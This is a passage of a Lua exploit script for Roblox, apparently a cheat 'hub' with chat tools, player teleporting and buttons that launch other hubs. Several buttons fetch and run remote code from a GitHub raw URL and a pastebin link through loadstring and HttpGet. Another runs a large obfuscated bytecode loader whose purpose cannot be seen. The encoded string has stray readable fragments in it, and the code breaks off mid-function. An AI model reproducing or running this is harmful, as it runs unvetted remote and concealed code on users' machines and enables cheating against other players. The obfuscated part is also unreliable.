                if cache[dependencies['Chat'].chatbar] == nil then
                    cache[dependencies['Chat'].chatbar] = true;
                    dependencies['Chat'] = getchat()
                    bindable:Fire(dependencies['Chat'])
                end
            end)
        end)
        
        game:GetService("UserInputService").InputBegan:Connect(function(k)
            if k.KeyCode then
                if k.KeyCode == Enum.KeyCode.Tab then
                    if focused then
                        if last then
                            local object = dependencies['Chat'].chatbar;
                            trueautofill(last, object)
                            wait()
                            object.Text = object.Text:sub(1, #object.Text - 1)
                        end
                    end
                end
            end
        end)
        
        local getplayer = function(t)
            for i = 1, #t do
                if t:sub(i, i) == ']' then
                    return game:GetService("Players"):FindFirstChild(t:sub(2, i - 1));
                end
            end
            return nil;
        end
        
        local getvalue = function(t)
            for i = 1,#t do
                if t:sub(i,i) == ' ' then
                else
                    return t:sub(i,#t)
                end
            end
            return 'void'
        end
        
        local scrollers = {};
        
        game:GetService("UserInputService").InputBegan:Connect(function(input)
            if dependencies['Chat'] then
                if input.UserInputType == Enum.UserInputType.MouseButton2 then
                    local m = game:GetService("Players").LocalPlayer:GetMouse()
                    local objs = game:GetService("Players").LocalPlayer.PlayerGui:GetGuiObjectsAtPosition(m.X, m.Y)
                    for i, v in pairs(objs) do
                        if v:FindFirstChild("TextButton") then
                            if v:FindFirstChild("Scroller") then
                                return
                            end
                            local s = scroller(v);
                
                            for i, v in pairs(s:GetChildren()) do
                                if v:IsA("TextButton") then
                                    v.ZIndex = 20;
                                end
                            end
                
                            table.insert(scrollers, s);
                            if #scrollers >= 2 then
                                scrollers[1]:Destroy()
                                scrollers = {
                                    s
                                }
                            end
                            s.Parent.ClipsDescendants = false;
                            s.MouseLeave:Connect(function()
                                s:Destroy();
                            end)
                
                            s.CopyMessage.MouseButton1Click:Connect(function()
                                setclipboard(getvalue(v.Text))
                                s:Destroy();
                            end)
                
                            s.DeleteMessage.MouseButton1Click:Connect(function()
                                v:Destroy()
                            end)
                
                            s.CopyUser.MouseButton1Click:Connect(function()
                                local t = v.TextButton.Text;
                                for i = 1, #t do
                                    if t:sub(i, i) == ']' then
                                        setclipboard(t:sub(2, i - 1));
                                    end
                                end	
                                s:Destroy()
                            end)
                
                            s.Unmute.MouseButton1Click:Connect(function()
                                sendmsg("/unmute "..tostring(getplayer(v.TextButton.Text)))
                                s:Destroy()
                            end)
                
                            s.Mute.MouseButton1Click:Connect(function()
                                sendmsg("/mute "..tostring(getplayer(v.TextButton.Text)))
                                s:Destroy()
                            end)
                
                            s.Tp.MouseButton1Click:Connect(function()
                                local plr = getplayer(v.TextButton.Text)
                                local hrp = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart;
                                local them = plr.Character:WaitForChild("HumanoidRootPart");
                                hrp.CFrame = CFrame.new(them.Position)
                            end)
                        end
                    end
                end
            end
        end)
        
        bindable.Event:Connect(function(tbl)
            local bar = tbl.chatbar;
            bar.ZIndex = 2;
            bar.Parent.TextLabel.ZIndex = 3;
            local clone = bar:Clone();
            clone.Name = 'AutofillBox'
            clone.Parent = bar.Parent;
            clone.TextEditable = false;
            clone.ZIndex = 1;
            clone.TextTransparency = .5
            clone.PlaceholderColor3 = Color3.fromRGB(0, 0, 0)
            
            bar:GetPropertyChangedSignal("Text"):Connect(function()
                focused = true;
                local txt = bar.Text;
                if txt == '' then
                    clone.PlaceholderText = '';
                    return;
                end
                match(txt, bar)
            end)
            
            bar.FocusLost:Connect(function()
                clone.PlaceholderText = '';
                focused = false;
            end)
        end)
    end,
})

local Button = Tab2:CreateButton({
	Name = "Dollhouse Private Hub GUI",
	Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Sinduru/FsuVxzEs/main/PrivateHub.lua", true))()
    end,
})

local Paragraph = Tab7:CreateParagraph({Title = "Owner", Content = "mrg#9745"})

local Paragraph = Tab7:CreateParagraph({Title = "Helper/Assistant", Content = "vh#8022"})

local Button = Tab6:CreateButton({
	Name = "Destroy UI/GUI",
	Callback = function()
		Rayfield:Destroy()
	end,
})

local Button = Tab2:CreateButton({
	Name = "KZX's GUI",
	Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/fpMVfF7B", true))()
    end,
})

local Button = Tab2:CreateButton({
	Name = "Dollhouse DHRP GUI log/password are DHRP",
	Callback = function()
-- DHRP WAS MADE BY DUU1AR
-- PASSWORD = DHRP
-- USERNAME = DHRP
return(function(DHRP_h,DHRP_m,DHRP_p)local DHRP_k=string.char;local DHRP_e=string.sub;local DHRP_l=table.concat;local DHRP_r=math.ldexp;local DHRP_s=getfenv or function()return _ENV end;local DHRP_o=select;local DHRP_g=unpack or table.unpack;local DHRP_i=tonumber;local function DHRP_n(DHRP_h)local DHRP_b,DHRP_c,DHRP_d="","",{}local DHRP_f=256;local DHRP_g={}for DHRP_a=0,DHRP_f-1 do DHRP_g[DHRP_a]=DHRP_k(DHRP_a)end;local DHRP_a=1;local function DHRP_j()local DHRP_b=DHRP_i(DHRP_e(DHRP_h,DHRP_a,DHRP_a),36)DHRP_a=DHRP_a+1;local DHRP_c=DHRP_i(DHRP_e(DHRP_h,DHRP_a,DHRP_a+DHRP_b-1),36)DHRP_a=DHRP_a+DHRP_b;return DHRP_c end;DHRP_b=DHRP_k(DHRP_j())DHRP_d[1]=DHRP_b;while DHRP_a<#DHRP_h do local DHRP_a=DHRP_j()if DHRP_g[DHRP_a]then DHRP_c=DHRP_g[DHRP_a]else DHRP_c=DHRP_b..DHRP_e(DHRP_b,1,1)end;DHRP_g[DHRP_f]=DHRP_b..DHRP_e(DHRP_c,1,1)DHRP_d[#DHRP_d+1],DHRP_b,DHRP_f=DHRP_c,DHRP_c,DHRP_f+1 end;return table.concat(DHRP_d)end;local DHRP_i=DHRP_n('24521J27521I21R27521J23I22H21W21V22E22H22C22A21I21G27922H22A21S21I21Q27922S22C21X22A22A22H23421U22M21I21E27923521X22E22I27I21P27923I22I22E22822A23F22E22D22A22J27P27922R22A22721V28G28I28K21C28M28O21V23922G22721I28927528N28P23921U21V21V22G22H21I21F27923D28628827923723J22T22V1N23F23C23423I23D21I21D27922V22E27U22H21V29C27922829G21I28U27523822G27U27Y28029221J23F22G22822M22H2842A421327923922E22C22K22821X22G21U22H22B2A822J2A91429T2792AY2B02A52792292AT22I22T23423927K27921J25Z22G23B21I1X2AN2AP2AR2AT2AV22B22R28527C21Z29X27W22C2262BE2BF25J1821I21K2AN2A922B22A21X22S22M22522A22V22M22728J2C02BF21J27729V22G21W22M21V22M29A28127922Q23722M22I1521G1123H26R22024A26826L1821G22W24V1726V22Z23R26D2C329D2752CB2CD2CJ21J21Z21Z23B2DN26V21U2BJ29U2752B829G1621G26221I25B25326321M22S2D926L25Y25S25L1826N22U23S2CU27528B28D27I1W27921X22D22722E21W21W22A2CR22B1D1O1O14121017111E2F21F1021I21O28A28C28E2B421X142DN21J1D2DR2CK21J1A2FL2CK2392BJ27Q2DK22C22E22J22A22R22621Z27I2DJ21J23622H21U22I2EI21J22S22J22M27H2FA27R2GC27H23827W21V2C92A127522T22A22C21V2FI2322BJ2AD2GB2GD22A27S2FW22A21G23Z21524Y26422U23Z23T2D923024H1826V22T25624V2D926U22223621J1225924N2D92CK22F2BI2FI2DU2DN2532342FP27925323I2I027525323C2FS27923J22G2872EK28E21G22C24322325Z25Y22724I2D922D22522D24725X22I2552D921R26621U21J26X25426Q2HR2BF23R21Y2DR26F25623O22F1W23926T2D923B23T25D22W25D21Y26B2J327923B2282I421J2532362DR1U25D25M23S26I1925V2C32AD2AF2AH22H28R2CI26826O24U26G24H1423U2D926225C24A24P26G22J2562JN27922M2JR27A2BJ2G323529A2A02822FU22M2352802G32942A021L27929O29Q23D1N22T23622U22Q23I2LD23729128V28P2FF2B127829328W2DL2H22CK25323A2BJ21M2CV2EU21X22H29G2K822J21G23N25W23022W25I21H2722C32LP21J22Q22S23622T23D23A23E2362FI2372LX29V2ES21W21S2C72M421G22723P23B22F2591W25Z2ME29V23A22S22S22O23C22T2LJ2LY27522Q2M02M22IC22H21Z29721G25722L25B22W26122M2JM2DN1N2JQ21I2BF2FI1E2MR27529W2ET2MV21X22B27B2NM2GS2FM2JU2LK2752K52AI2ID2H223D25M1721J22Z25H2662C32FB2OG2AG2AI2962982CT2KZ2AE29P29R2GF2LQ28P22O2852DP22A22B2CL21I2AM27523E2AU2EU2OX29922H1623722G21S29B2A621J22C29A27M2GR2B627523J29821Z2342EV21I21027922N2Q021W2EY1O21T131P22M2C829Z1P28727J27921Z22J21X2OF21J2Q221V22S2C921T2GY2PX21J22V22J22E2262C921W2P42AE22G2FV22J2QZ2R12GM2L72PF22A22I28I21X21W22N22M21Z2FZ2G12QX22V27U22I22M2G72GN21J23D29A22A2762AD23A22C2PT2AV21V23A2IE2LU22U2BJ21127923E29X22K2EV2QM2AP2GZ2QU2QW2RD2QQ2EV2RQ22G22B21U2GR27B22922G2RP2R027H23I22B2CM2EJ22H2SW2RN27I2P023A2ET2Q321N2Q62Q022W27U21Y21U22A27D2QK27521W2262PQ2EO22A2TI2TK2A02OT2GA23623D22R29R23623F22W22P152TM2MG21X28K2EN2752Q721V21Z2Q92EZ2UD21Z22D2AI1P2A92281O28E2A02DW21J23E2EV22N2SR2U723423622R2RV28Y22B2262R52PZ2UE2QT21X2QV2GE2AD23H22S23C23D2372GQ2SR27I2C52DK2TP1Q2L222H28E21X21Z21X2AI2A02TD2752362272QM22G2CQ1Q2AB2T21Y29V2AT2991Q2NH2C91Q2T12GK22M22922M2GM1Z27R2WH27M22J2VP2AI2VS2VU2VW2RV22N21S2QF2RV27M28P2QX22N22A22E2C82RI21I2272TE2UE2UG1O22B22M21W2PT2O81P2PT22I1O22E21Z22M1O21S22A22D2UW22G22K21W1O1F1416111714112Y11F2F6152Y216151F1O22L21Z23J1E2262281F23322S23523G23J21X1F22G22G23I22R22C2AF1423221U1321U22U2351423D23F22Q23E1123622V22823923323I23222V23A15225102VE23C161E22H21S23E22723J22D22T22Q22C23222K2312311223823121U2QX2PT29Z2GK2B22752RF28I22B2R42P02CR21V2FX21I2NF21J22W22W1T1T23J22O23I2371D310T310R2R52C82XH2VV21Z2CR2CT2G321V2G02G22EO2GD22N2G92PT2AZ2QO2MF2PK2G72RH2C01N1M22E22A23A310E21J2WJ28J310I2X02A42FT2MG2NI29G1D2G921T2FW2TJ2RV2342A42US2AI2GC27M2R523I29M23A22B22B27U2ET31252AD312B28729N2AI22K312521A2XB2UF2QA2AT22D2AZ2272XK2IB2UP29G2XY21I2NZ2751O2QP312R22A1N29F28731252G32S722A31252MF2RQ2RF2RT22I313K27923A23F22R312P2792ZP23D2G52PT2C821I2VY2PS2KX2GK1Q311A2RO2PE21J2XO2QM2GD22E311722H2YF21W311829V23C22S2V12PR23J2X52X721W21H2792SN2RV2L52RV29J29L2QX22P2XG22M31322RZ2CL2AD2AZ2X627D2VV2VR2RV2A32QJ314T2Q02QR21I1M312Y2XD2BV27D2XT2UL2XL1O28521S1O22A22T2331022721Y22M314S29V2R02R22X82TW2AF2R82RA316C2RV23G2GD22K310O313V2S32TK21W1N2VI22H2WK2T22G321S22E2CQ2FI2C22BF2152BF2162FM21J1N22R2CK2NZ1H23B2792Q52NZ314Y21F2BL275317G27531762762793179317B21J317D317F2CL21J317I317K21J317M21J317O317X279171P27927K29D2SC2792P0318B2NZ2US1N317P2NZ28U318B27K2MF27929D313B2BF2NZ2G33177314Y317S318S3175317W2113147318G22Y2CK27Q318H2CK28931962BF2FB318B314Y31472CK314Y2NZ318B275310P318E21J2SN319F317W317J279217317W21J1S279318Q21J2PR2QP22S27E21V21U21W2A82C82FI2KR2V22SR2V52PR2TH2TJ2TL2C022Q2U9311U2UU21V2UW2T2317721J310P21J21B319T31842ON317W317H21J319C21J2G331962C028231962G329U31962P027K2DW28227Q2NZ318S317Z31BE31AZ1A21J2822PR21J1C3184282314Y21327K2NZ27K318V22V317W318V275319V317P27623H2BE2111G319W317Q2FM314Y319L2FI275314Y31CC318I31CA31AX318431B0318T317P31CG31AZ31CF31AU319631CP31CH21J27K2P027931CU31CQ31CW31CS27527K31BW31D129D31CY31D4318431CV318P31CJ29D29D31CV28231D931B131DB31D1282318Q31B931BL31CL27529U31DJ31BR31DR21J29U31DO31DS31DX31DW28U31DJ29U31CP318B28U31DZ319Y31EA31CV27831DJ28U31E627527831E927827831CV27Q2US27931EL31DW31BI275319627Q27Q31CV28931EO27531EW31DW28931E928928931CV2FB31EZ21J31F631DW2FB31E92FB2FB31CV2TD31BN27531FG31DW2TD31E92TD2TD31CV2LY31FJ21J31FQ31DW2LY31E92LY2LY31CV2L731DJ31G031DW2L731E92L72L731CV2C5318N27531G931AV2BF27Q289318B2C5314731962C52C52LY314E21J2FB2C531AW2NZ27Q2L72PE2NZ2TW31GJ21J314E31GM21J2C521231D12AM319I318B31H731HA2752SC319I2792C52SC31BS317P31GN21J31GU318021J2WM31HO2W82BL31H131AT31ET27531HM31CV2AM312X31HE27531H7317Z318B2SC21927921131BK2Q5317Z31H231H531HP31HK317W2EN31HI31HY31AS31CJ31HZ31H821J31I631I421J319S31I331CQ31IS31HP318331HH31IH31IF317W21831IG31AW314Y27Q31742PE314Y31FD31D12C531H331IM31H631IQ31Revolve Hub21J31HC31IA31I331HG31IM31HJ31J3314Y31HM31J731HP2WM31HV31IO31IG31I021J21431JN31JL31IR31K42SC3199318B31ID2FM2C52Q531II314Y31IK31JE31IN31HX31IG2C531K131IY31H731IV31D12SC31IY2Q531J031IM31KE31JS21J31J531GT31CR315Q1L31KI31JG31KL31K5318B2AM1J31K431H71I31K7317T31KC31CQ31KF21J1K31IG31H11V31JZ2C531C831H42C51U31KY31C831IL31IG31C2317831JH31DW2AM1R31LC21J31M431IW2SC31M731D12Q531MA31J131KX31JB21J1T31J631CR1Q21J318731AW27K31J931J327K31JD31H131L631HM31JM31IF31JK31MX31KR31D12BF31IL31II27K31JU31DA2Q531JX31IM31HW31M031L731K11O31M531IY2SC31AW31MB31K62CK31KD31842PE27K31KH31JY31KK31IP31L931NM31D131H71631LF31I631IC21J152BF23J31IG31MF31DA31L031HN31DA31L331L531LP31L82752AM1431M51331LF1231LH31JR31NQ31LK31LM31IM31LO31NU31IG31LR31M131LU31OR31LW31KI31LZ31LS31M231M631M531MA31I731P731IW31MC31LH31O931D231MI31L131D231ML31MN27529D27Q1131J329D31MT31IM31MV31IG31MX31H931M531JK31HF31OP31NP31PM31L731AW29D31N931KI31NC31P531K11031NH31LF1F31K431KB31NN31J22PE29D31NS31NB31OG31KN31M531O031M831NX31KA31O431PE31Q231DK31OB31Q521J31OE31MU31OG31PW21J31LB31IW31LD31LF1H31Q131II29D31LL31LX2C531OV31ND31HM31OY31L731P031Q331P231H131P431M131K131P931IT31RU31CQ31RW31PD31QI31PF29D31PH31OC31DK31PK31S431BD21J31JA27528231PS31IG31PU31JI31NW31MZ31N231PA31JP31OT31II28231N731DQ31Q7319031IG31Q931GS31K031IQ31NG31R831QT31I31E31QG31NX31ME31QX28231QM31ST31QO31IQ31KO21J31QR31N131KT2FJ31QW31SN31KZ31MJ31DQ31R231PT31R431IQ31OK31SZ31OM31QS31OO31QI31OQ31SB31OS31RG21J31RI31P531RL31HM31RN31DQ31RP31IM31RR31NE31IQ31RW31H731RW31M931T331MD31KW31T631MH31TL28231S631AW29U31PO31J329U31SD31JF31TP31SH31PY31LF31SL31N431US31Q431E031SR31QN31OW31KM31IQ31BP31SZ31NI21J1B31T331IE31UJ31II29U31T82C531Q931RS31TB31M531BK31QS31TG1931TI31V231QZ31E031TN31SE31UW31OI31R631M531LE31QS31RB31TW31QX29U31RF31KI31U231M131U431IG31U629U31U831LY31TA31NW31UD31PB31N131RY31WN31BO31O831NP318H29U31S331UP21J31UO27528U31UR2PE28U31UU31J331RJ31PV31JJ31UY31QS31V031LI31J328U31SP28U31V531T931V731P631VA31NY31T031CQ1831VF31VU31X321J31VK31KJ31X731V831NW31TC31VQ31TF31T331VT31S031QX28U31VW31EA31VY31UV31XK31R531R731XN31W431N131W631N331XD31XT31WA31LN31OG31WE31LT31XE21J31WI2C531UA31NV31W131WM31UF31WN31QU31UI31WS31II28U31WW31X031WY31MM31S427827Q317E2PE27831X531SF31OH31MY31XA31N131XC31TX21J27831SP27831Q731AW27831HT31Q831WK31W123A31QD31QS23931XR31Y531II27831XV31VM31UB31XZ31M523831O131T323731XS31EH31TK31U031WC31L72HM31P523531J32782HM31GT2W827823421J31O7211320231YB31XX31ZI31PX31SZ31PZ31N231J131ZN27823I31TL27823H21J23G31S431EV2AE31J327Q31ZG31W031ZJ321431UZ31RC321J31V321J27Q31ZS31F021J31ZV31NT321131K131ZZ31VB31LF23E320331YJ31PF27Q320731ZX31IF31TC320C31VR320E320G321T320I31WB31OG320M31M1320O2PE27Q320R321G2QQ2RW31OF31YC31X9321O31XB321Q322P27A31TL27Q321D23C31S428927Q31BY2PE289321L322W31UX322Y31ZL323027528931SP289321V31FA321X31K6321Z31QA31IQ322231XN31VC22U322631T531II289322A31XK31QP31SZ322E31Y231PC21J320F320431J328931OB31YN31XK322M31L7322O323J2G431TL289320V22T31AZ320Z31X631P531R531SI321531ZM31QX289321A31PI289323531S42FB27Q22S31J331FF318Z31TO323E31W1324V321P31W731II31SV31PI2FB323N2FB321Y31V6322031V9320031N1317A324831VG31Z3325831XU31OT31XJ325P320A31SZ22Q320D324831Y4322731QX2FB324E31OU322L3211324J31GR324L325J322T22P322V3211324U31ZK31SK323I326G3250325421J321D22O31S42TD27Q23331J32TD323D326M322X31XN324W326Q2TD31SP2TD323N2TD325N3260323S31NW31XM31HB31XO2SC31XQ325U322H2TD3242326131W131TC3264322F3248232327O322J324F3211324H31HM326F2TD322R31AW2TD320V326K31SS3210317R31MW31AZ31SA325E322Z325G3271323231PI2TD326V31S42LY27Q23131J32LY3273324T3275327J3277328J2PE2LY31SP2LY31XI31VL322B2AM327I31IT31VC230323Y31VH328T325Y31U0320831YW322C31VP326531NL31TR326831II2LY31Y82LY31YA324S31M131YD31W331RA326Q2LY31YM326C31XK31YP21J31U62LY31YT319U329731Z031RV31LF31WP31Z231NO329Q31UL31PI2LY31WZ319M322I22Z31J32L7328V329W328X31IT328Z31YJ31ZN2L731SP2L7323N2L7327E32963243325Q322331QS329C327N324B2PE2L7327Q327G327S329L327V329N322H2L7324E1D31IG320K31HM328231IG326F2L7328631GD322T319331R3325C321N3276325F27531BP31V121329U2L7326S31AW2L7325332CC21J22X310Q31X72L722F321122E31DX321D31H7317P2BE31VE31FK2BF32CT31FU32CV31C9319R31X8319H31IM31GL31M122D31XN22C31LH31H731K132D431IF2AM2RZ31PA2292FM31PX314Y31962AM2AM22831AZ31GX21J2PB27931O031GQ2BF32CQ31LF32DS31ND31Q022N31NL320K2Q52Q532E2319632E521J22M31E131CQ23Q21H2NZ2Q5319Q27532EE313B315Q2AM318Q32EI21J23X32EF31AZ2TD2SC32DZ1N31ZZ32E132E331CJ32E932E7317L31HP22L32EC2SC23Y32ES32EH317Z32F931BG27932ER32EL31X6275317U2AM26U32ES22K31B1317Z32FM319H32EU32DR317Q317A31Q022J317T327X2SC32FR21J22I32FP27932G231R131K5318Q31SS2SC31GL31O531Q032DF2752WM22H2FM2SC2WM32DK32F42SC22G31D12W832DC2W82W821Z31D12BL320K2BL2BL21Y31ND32H021J21X2BF31KB31CC2TD2WM21W31IA327D21J21V27921D28U2W826E32ES32FE27532HL32HN21J26B32ES31SS2W832HG31ET317A2WM2W82IY32EP26N32HT32HE21T32HH312X2W832I332EO317Z32IA317X29D2WM319X320O2W82WM27931LL317Z314Y31AW2BL21S21J2XA32IP21J22621J2252BF2W831CP319632GU21J22432GX32CX31KK32H432GG31IN2232FM2BL31AT32GN31K62BL222275320O31AT2W831JN32JE31842792EN2G3318B31AT22131K4312X22031K431I925331K431J52522FM2EN31J5319H31BK31AT326K31HE2Q531AT25131K431AT2502FM312X2UB2BF31I931I931Q327925Q32ES317R31762BL24Z275327031763176319S21D312X317632KS32IB32KR32KT317A32KV21J32KX21J32KZ318231IU32DP32LG32KG31PM317Z25O32ES21D31NG31AT2MB31AY32EP32LS32ET31IN32LK31DX312X31AT23I21G32L72EJ32M332LW31AT31GL28231AT31AT32JA31I932JC2CK31AT31I931CV312X24Y2FM32KP31GF21J31I924X21J32KC27532K82FM31KQ28231AW319S25B21J25A31D1317632LY31BT32LH25932LG1731QC319S25821J25732N421J25531K431742542FM317631CP2PE319S25632LG279317631FT317431DA31AW317424M21J24L31D131K324J31CJ31K331K332DH317R32O821J32DO1N2EN32OC27Q2PE317424K31K231S4317424I32CI27931K332NY27531K332O124H31J331K332OL31PI31K332OP22W2BF319927K31AW318H32O124G31D1315Q24V32Revolve Hub21J31L431GL321F31L431L432GW318B31LL24U2FM315Q315Q31LL2PE318H32OL315Q32P821J32P32BF315Q32OT32G832O124T31ND31L42Q532OI275315Q32OL31L431AW315Q32Q031Z831L432NY31OO31L432O124S31D131LL32EW27531LL31LL32FY2PE31L432OL31LL31AW31L432QH32QS318831S431LL32O124R31J331LL32OL2AM31AW31LL32R231W232NY2W831LB32O124Q31H227K31LB32OL31H71732RI32PZ32OQ2NZ317631LB2NZ32N7319S24N32NT2NZ31J5319S32RY27K31I924W31TK1N320V31J531AT24P318Y32MN27931J532NO2BF31KQ2NZ32MZ21J24O21J247318Y31Q32PE317632IR312X32SV32J431TK31AW317632IW24631J3317627431IV320O317432IK32JK32OM31J0326W3174319G31C132CZ275');local DHRP_a=(bit or bit32);local DHRP_d=DHRP_a and DHRP_a.bxor or function(DHRP_a,DHRP_c)local DHRP_b,DHRP_d,DHRP_e=1,0,10 while DHRP_a>0 and DHRP_c>0 do local DHRP_f,DHRP_e=DHRP_a%2,DHRP_c%2 if DHRP_f~=DHRP_e then DHRP_d=DHRP_d+DHRP_b end DHRP_a,DHRP_c,DHRP_b=(DHRP_a-DHRP_f)/2,(DHRP_c-DHRP_e)/2,DHRP_b*2 end if DHRP_a<DHRP_c then DHRP_a=DHRP_c end while DHRP_a>0 do local DHRP_c=DHRP_a%2 if DHRP_c>0 then DHRP_d=DHRP_d+DHRP_b end DHRP_a,DHRP_b=(DHRP_a-DHRP_c)/2,DHRP_b*2 end return DHRP_d end local function DHRP_c(DHRP_b,DHRP_a,DHRP_c)if DHRP_c then local DHRP_a=(DHRP_b/2^(DHRP_a-1))%2^((DHRP_c-1)-(DHRP_a-1)+1);return DHRP_a-DHRP_a%1;else local DHRP_a=2^(DHRP_a-1);return(DHRP_b%(DHRP_a+DHRP_a)>=DHRP_a)and 1 or 0;end;end;local DHRP_a=1;local function DHRP_b()local DHRP_b,DHRP_c,DHRP_e,DHRP_f=DHRP_h(DHRP_i,DHRP_a,DHRP_a+3);DHRP_b=DHRP_d(DHRP_b,55)DHRP_c=DHRP_d(DHRP_c,55)DHRP_e=DHRP_d(DHRP_e,55)DHRP_f=DHRP_d(DHRP_f,55)DHRP_a=DHRP_a+4;return(DHRP_f*16777216)+(DHRP_e*65536)+(DHRP_c*256)+DHRP_b;end;local function DHRP_j()local DHRP_b=DHRP_d(DHRP_h(DHRP_i,DHRP_a,DHRP_a),55);DHRP_a=DHRP_a+1;return DHRP_b;end;local function DHRP_f()local DHRP_b,DHRP_c=DHRP_h(DHRP_i,DHRP_a,DHRP_a+2);DHRP_b=DHRP_d(DHRP_b,55)DHRP_c=DHRP_d(DHRP_c,55)DHRP_a=DHRP_a+2;return(DHRP_c*256)+DHRP_b;end;local function DHRP_q()local DHRP_d=DHRP_b();local DHRP_a=DHRP_b();local DHRP_e=1;local DHRP_d=(DHRP_c(DHRP_a,1,20)*(2^32))+DHRP_d;local DHRP_b=DHRP_c(DHRP_a,21,31);local DHRP_a=((-1)^DHRP_c(DHRP_a,32));if(DHRP_b==0)then if(DHRP_d==0)then return DHRP_a*0;else DHRP_b=1;DHRP_e=0;end;elseif(DHRP_b==2047)then return(DHRP_d==0)and(DHRP_a*(1/0))or(DHRP_a*(0/0));end;return DHRP_r(DHRP_a,DHRP_b-1023)*(DHRP_e+(DHRP_d/(2^52)));end;local DHRP_n=DHRP_b;local function DHRP_r(DHRP_b)local DHRP_c;if(not DHRP_b)then DHRP_b=DHRP_n();if(DHRP_b==0)then return'';end;end;DHRP_c=DHRP_e(DHRP_i,DHRP_a,DHRP_a+DHRP_b-1);DHRP_a=DHRP_a+DHRP_b;local DHRP_b={}for DHRP_a=1,#DHRP_c do DHRP_b[DHRP_a]=DHRP_k(DHRP_d(DHRP_h(DHRP_e(DHRP_c,DHRP_a,DHRP_a)),55))end return DHRP_l(DHRP_b);end;local DHRP_a=DHRP_b;local function DHRP_n(...)return{...},DHRP_o('#',...)end local function DHRP_l()local DHRP_i={};local DHRP_d={};local DHRP_a={};local DHRP_h={[#{{300;252;690;507};{600;410;62;767};}]=DHRP_d,[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}]=nil,[#{{842;545;539;291};{13;433;950;770};"1 + 1 = 111";"1 + 1 = 111";}]=DHRP_a,[#{{193;263;744;777};}]=DHRP_i,};local DHRP_a=DHRP_b()local DHRP_e={}for DHRP_c=1,DHRP_a do local DHRP_b=DHRP_j();local DHRP_a;if(DHRP_b==0)then DHRP_a=(DHRP_j()~=0);elseif(DHRP_b==3)then DHRP_a=DHRP_q();elseif(DHRP_b==1)then DHRP_a=DHRP_r();end;DHRP_e[DHRP_c]=DHRP_a;end;for DHRP_a=1,DHRP_b()do DHRP_d[DHRP_a-1]=DHRP_l();end;for DHRP_h=1,DHRP_b()do local DHRP_a=DHRP_j();if(DHRP_c(DHRP_a,1,1)==0)then local DHRP_d=DHRP_c(DHRP_a,2,3);local DHRP_g=DHRP_c(DHRP_a,4,6);local DHRP_a={DHRP_f(),DHRP_f(),nil,nil};if(DHRP_d==0)then DHRP_a[3]=DHRP_f();DHRP_a[4]=DHRP_f();elseif(DHRP_d==1)then DHRP_a[3]=DHRP_b();elseif(DHRP_d==2)then DHRP_a[3]=DHRP_b()-(2^16)elseif(DHRP_d==3)then DHRP_a[3]=DHRP_b()-(2^16)DHRP_a[4]=DHRP_f();end;if(DHRP_c(DHRP_g,1,1)==1)then DHRP_a[2]=DHRP_e[DHRP_a[2]]end if(DHRP_c(DHRP_g,2,2)==1)then DHRP_a[3]=DHRP_e[DHRP_a[3]]end if(DHRP_c(DHRP_g,3,3)==1)then DHRP_a[4]=DHRP_e[DHRP_a[4]]end DHRP_i[DHRP_h]=DHRP_a;end end;DHRP_h[3]=DHRP_j();return DHRP_h;end;local function DHRP_i(DHRP_a,DHRP_k,DHRP_e)DHRP_a=(DHRP_a==true and DHRP_l())or DHRP_a;return(function(...)local DHRP_d=DHRP_a[1];local DHRP_f=DHRP_a[3];local DHRP_l=DHRP_a[2];local DHRP_n=DHRP_n local DHRP_b=1;local DHRP_h=-1;local DHRP_r={};local DHRP_q={...};local DHRP_o=DHRP_o('#',...)-1;local DHRP_j={};local DHRP_c={};for DHRP_a=0,DHRP_o do if(DHRP_a>=DHRP_f)then DHRP_r[DHRP_a-DHRP_f]=DHRP_q[DHRP_a+1];else DHRP_c[DHRP_a]=DHRP_q[DHRP_a+#{{931;833;267;702};}];end;end;local DHRP_a=DHRP_o-DHRP_f+1 local DHRP_a;local DHRP_f;while true do DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[1];if DHRP_f<=46 then if DHRP_f<=22 then if DHRP_f<=10 then if DHRP_f<=4 then if DHRP_f<=1 then if DHRP_f==0 then if(DHRP_c[DHRP_a[2]]==DHRP_c[DHRP_a[4]])then DHRP_b=DHRP_b+1;else DHRP_b=DHRP_a[3];end;else local DHRP_b=DHRP_a[2];local DHRP_d=DHRP_c[DHRP_b];for DHRP_a=DHRP_b+1,DHRP_a[3]do DHRP_m(DHRP_d,DHRP_c[DHRP_a])end;end;elseif DHRP_f<=2 then DHRP_c[DHRP_a[2]]=DHRP_k[DHRP_a[3]];elseif DHRP_f>3 then DHRP_c[DHRP_a[2]]=DHRP_i(DHRP_l[DHRP_a[3]],nil,DHRP_e);else DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];end;elseif DHRP_f<=7 then if DHRP_f<=5 then local DHRP_h;local DHRP_f;DHRP_f=DHRP_a[2];DHRP_h=DHRP_c[DHRP_a[3]];DHRP_c[DHRP_f+1]=DHRP_h;DHRP_c[DHRP_f]=DHRP_h[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]={};DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]={};DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]={};DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];elseif DHRP_f>6 then if not DHRP_c[DHRP_a[2]]then DHRP_b=DHRP_b+1;else DHRP_b=DHRP_a[3];end;else 